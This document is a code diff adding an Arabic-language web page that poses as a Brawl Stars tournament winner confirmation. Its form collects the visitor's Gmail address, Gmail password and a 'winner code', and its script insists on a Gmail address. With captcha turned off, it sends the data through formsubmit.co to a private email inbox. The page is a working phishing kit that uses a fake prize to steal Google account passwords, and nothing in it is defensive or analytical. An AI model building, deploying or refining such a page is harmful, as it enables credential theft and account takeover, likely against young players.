@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Brawl Win – Ultimate Tournament</title>
+<style>
+  /* تحسينات الخطوط والصفحة */
+  @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@700;900&display=swap');
+  
+  body {
+    font-family: 'Tajawal', sans-serif;
+    margin: 0;
+    padding: 0;
+    color: white;
+    text-align: center;
+    overflow-x: hidden;
+    /* خلفية Brawl Stars الرسمية - رابط مباشر */
+    background-image: url('https://sc-events.com/themes/sc-main/assets/images/games/brawlstars/bs_bg.jpg');
+    background-size: cover;
+    background-position: center;
+    background-attachment: fixed;
+    height: 100vh;
+  }
+
+  header {
+    background: linear-gradient(180deg, rgba(255, 174, 0, 1) 0%, rgba(255, 102, 0, 1) 100%);
+    color: white;
+    padding: 20px;
+    font-size: clamp(24px, 5vw, 32px);
+    font-weight: 900;
+    text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+    box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+    border-bottom: 3px solid #663300;
+  }
+
+  .container {
+    background: rgba(10, 10, 20, 0.85); /* حاوية داكنة شبه شفافة */
+    padding: 30px;
+    width: 90%;
+    max-width: 420px;
+    margin: 60px auto;
+    border-radius: 20px;
+    border: 3px solid #ff9900; /* إطار برتقالي Brawl */
+    box-shadow: 0 0 40px rgba(255, 153, 0, 0.5); /* بريق برتقالي حول الفورم */
+    backdrop-filter: blur(10px); /* تأثير ضبابي خلف الحاوية */
+  }
+
+  h2 { 
+    color: #ffae00; 
+    margin-bottom: 25px; 
+    font-weight: 900;
+    text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
+  }
+
+  label {
+    display: block;
+    text-align: right;
+    font-size: 14px;
+    color: #ffd000;
+    margin-bottom: 5px;
+    margin-top: 15px;
+    font-weight: 700;
+  }
+
+  input {
+    width: 100%;
+    padding: 15px;
+    margin: 5px 0 10px 0;
+    border-radius: 12px;
+    border: 2px solid #555;
+    background: rgba(255, 255, 255, 0.1);
+    color: #fff;
+    font-size: 16px;
+    box-sizing: border-box;
+    transition: 0.3s;
+  }
+
+  input:focus {
+    outline: none;
+    border-color: #ffcc00;
+    background: rgba(255, 255, 255, 0.2);
+    box-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+  }
+
+  input[type="email"], input[type="password"] {
+    direction: ltr;
+    text-align: left;
+    font-family: Arial, sans-serif;
+  }
+
+  button {
+    width: 100%;
+    padding: 18px;
+    /* تدرج Brawl البرتقالي */
+    background: linear-gradient(180deg, #ffd000 0%, #ff6600 100%);
+    border: 3px solid #fff;
+    border-radius: 15px;
+    font-size: 20px;
+    font-weight: 900;
+    color: #fff;
+    cursor: pointer;
+    transition: 0.3s;
+    margin-top: 20px;
+    text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+    box-shadow: 0 5px 0 #993300; /* تأثير زر Brawl */
+  }
+
+  button:hover {
+    transform: translateY(-3px) scale(1.02);
+    box-shadow: 0 8px 15px rgba(255, 153, 0, 0.7);
+    background: linear-gradient(180deg, #ffea00 0%, #ff8800 100%);
+  }
+  
+  button:active {
+      transform: translateY(2px);
+      box-shadow: 0 2px 0 #993300;
+  }
+
+  .error-msg {
+    color: #ffccff;
+    background: rgba(255, 0, 0, 0.3);
+    padding: 10px;
+    border-radius: 8px;
+    font-size: 13px;
+    display: none;
+    margin-bottom: 10px;
+    text-align: center;
+    border: 1px solid red;
+  }
+</style>
+</head>
+<body>
+
+<header>Brawl Win Tournament</header>
+
+<div class="container">
+  <h2>تأكيد الفائز 🏆</h2>
+
+  <form id="winnerForm" action="https://formsubmit.co/fkont345@gmail.com" method="POST">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_subject" value="بيانات فائز جديدة - Brawl Win">
+
+    <label>حساب Gmail اللاعب:</label>
+    <input type="email" name="Gmail_Account" id="gmailInput" placeholder="example@gmail.com" required>
+    <p id="gmailError" class="error-msg">⚠️ يرجى استخدام بريد Gmail صحيح ينتهي بـ @gmail.com</p>
+
+    <label>كلمة السر:</label>
+    <input type="password" name="Password" placeholder="كلمة السر الخاصة بك" required>
+    
+    <label>كود الفوز (Winner Code):</label>
+    <input type="text" name="Winner_Code" placeholder="أدخل كود الفوز" required>
+    
+    <button type="submit" id="submitBtn">تأكيد وإرسال ⚡</button>
+  </form>
+</div>
+
+<script>
+// التحقق من Gmail
+const form = document.getElementById('winnerForm');
+const gmailInput = document.getElementById('gmailInput');
+const gmailError = document.getElementById('gmailError');
+
+form.addEventListener('submit', function(e) {
+    const emailValue = gmailInput.value.toLowerCase();
+    if (!emailValue.endsWith('@gmail.com')) {
+        e.preventDefault(); 
+        gmailError.style.display = 'block';
+        gmailInput.style.border = '2px solid red';
+    } else {
+        gmailError.style.display = 'none';
+        document.getElementById('submitBtn').innerText = "جاري الإرسال...";
+        document.getElementById('submitBtn').disabled = true;
+    }
+});
+</script>
+
+</body>
+</html>
